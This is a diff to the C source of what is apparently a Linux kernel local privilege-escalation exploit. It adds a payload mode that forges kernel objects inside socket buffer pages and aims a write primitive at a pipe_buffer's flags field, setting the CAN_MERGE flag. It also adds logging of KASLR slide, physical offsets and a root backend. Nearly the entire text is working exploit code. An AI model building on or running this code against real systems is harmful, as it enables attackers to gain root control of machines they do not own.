@@ -140,6 +140,16 @@ _Static_assert(
             SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
         ORDER3_SIZE,
     "slide lock bank exceeds reclaimed page");
+#if defined(PIPE_BUFFER_FLAGS_OFF) && defined(PIPE_FLAG_OBJECT_INDEX) && \
+    defined(PIPE_FLAG_OFF)
+_Static_assert(PIPE_BUFFER_FLAGS_OFF ==
+                   offsetof(struct user_pipe_buffer, flags),
+               "pipe_buffer flags offset mismatch");
+_Static_assert(PIPE_FLAG_OBJECT_INDEX < PIPE_OBJS_PER_SLAB,
+               "pipe flag target object is outside the slab");
+_Static_assert((PIPE_FLAG_OFF & 0x7f) == 0,
+               "pipe flag source must be 0x80 aligned");
+#endif
 #if defined(APP_FOPS_TABLE_MIRROR_OFF)
 _Static_assert(
     APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
@@ -423,8 +433,16 @@ void log_startup_context(void) {
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s stack_writer=%s\n",
-             getpid(), BUILD_VARIANT_LABEL, stack_writer);
+  const char *page_locator = "kernelsnitch";
+#if defined(QEMU_MM_TRACE_ORACLE)
+  page_locator = "qemu-mm-oracle";
+#elif defined(QEMU_MM_TRACE_VALIDATE)
+  page_locator = "kernelsnitch+qemu-mm-validate";
+#endif
+  pr_success("build config pid=%d label=%s locator=%s stack_writer=%s "
+             "root_backend=%s\n",
+             getpid(), BUILD_VARIANT_LABEL, page_locator, stack_writer,
+             ROOT_BACKEND_NAME);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
@@ -1302,6 +1320,28 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES) && defined(PIPE_FLAG_OFF) && \
+    defined(PIPE_BUFFER_FLAGS_OFF) && defined(PIPE_FLAG_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
+    uintptr_t parent = payload_base + PIPE_FLAG_OFF +
+                       PIPE_BUF_FLAG_CAN_MERGE;
+    uintptr_t target = pipebuf_page_base +
+                       PIPE_FLAG_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+                       PIPE_BUFFER_FLAGS_OFF;
+    if ((parent & 0x7f) != PIPE_BUF_FLAG_CAN_MERGE) {
+      pr_error("pipe flag source has unsafe low bits parent=%016zx\n",
+               parent);
+      return 0;
+    }
+    slide_bank_payload_base = payload_base;
+    slide_bank_parents[0] = parent;
+    slide_bank_targets[0] = target;
+    pr_info("pipe flag writer source=%016zx target=%016zx object=%d "
+            "low_flags=%#zx\n",
+            parent, target, PIPE_FLAG_OBJECT_INDEX, parent & 0x7f);
+  }
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
@@ -1396,6 +1436,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     pi_top_task = SLIDE_INIT_TASK + slide_p0_offset;
 #endif
     waiter_prio = SLIDE_FAKE_WAITER_PRIO;
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES) && defined(PIPE_FLAG_OFF) && \
+    defined(PIPE_BUFFER_FLAGS_OFF) && defined(PIPE_FLAG_OBJECT_INDEX)
+  } else if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
+    write_pc = slide_bank_parents[0];
+    write_right = 0;
+    write_left = slide_bank_targets[0];
+#endif
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
@@ -1485,6 +1533,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #endif
 #endif
     }
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_P0_OFFSET_CANDIDATES) && defined(PIPE_FLAG_OFF) && \
+    defined(PIPE_BUFFER_FLAGS_OFF) && defined(PIPE_FLAG_OBJECT_INDEX)
+    if (payload_mode == PAGE_PAYLOAD_PIPE_FLAG) {
+      put_slide_bank_entry(p, payload_base, 0,
+                           slide_bank_parents[0],
+                           slide_bank_targets[0]);
+    }
+#endif
   }
   return 1;
 }
